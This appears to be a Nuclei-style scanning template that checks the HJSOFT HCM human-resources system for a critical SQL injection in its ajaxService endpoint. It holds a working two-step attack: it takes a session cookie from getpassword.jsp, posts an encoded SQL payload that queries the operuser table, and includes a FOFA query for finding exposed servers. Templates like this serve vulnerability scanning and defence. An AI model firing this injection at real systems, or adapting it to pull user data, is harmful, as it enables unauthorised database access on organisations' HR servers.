http:
- extractors:
  - internal: true
    name: get_cookie
    part: header_1
    regex:
    - 'Set-Cookie: (.+?);'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && status_code_2 == 200
    - contains(body_2, md5(random_string))
    type: dsl
  raw:
  - 'GET /templates/index/getpassword.jsp HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /ajax/ajaxService HTTP/1.1

    Host: {{Hostname}}

    Cookie: {{get_cookie}}

    Content-Type: application/x-www-form-urlencoded


    __type=extTrans&__xml=%7B%22functionId%22%3A%22151211001137%22%2C%22sql%22%3A%22select~20sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{random_string}}''))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser%22%2C%22nbase%22%3A%221%22%7D

    '
id: hjsoft-hr-system-sqli
info:
  author: leadlife
  description: "\u5B8F\u666F\u4EBA\u529B\u8D44\u6E90\u4FE1\u606F\u7BA1\u7406\u7CFB\
    \u7EDF ajaxService SQL \u6CE8\u5165\u6F0F\u6D1E"
  metadata:
    fofa-query: app="HJSOFT-HCM"
  name: hjsoft-hr-system-sqli
  severity: critical
  tags: hjsoft,sqli
variables:
  random_string: '{{randstr}}'
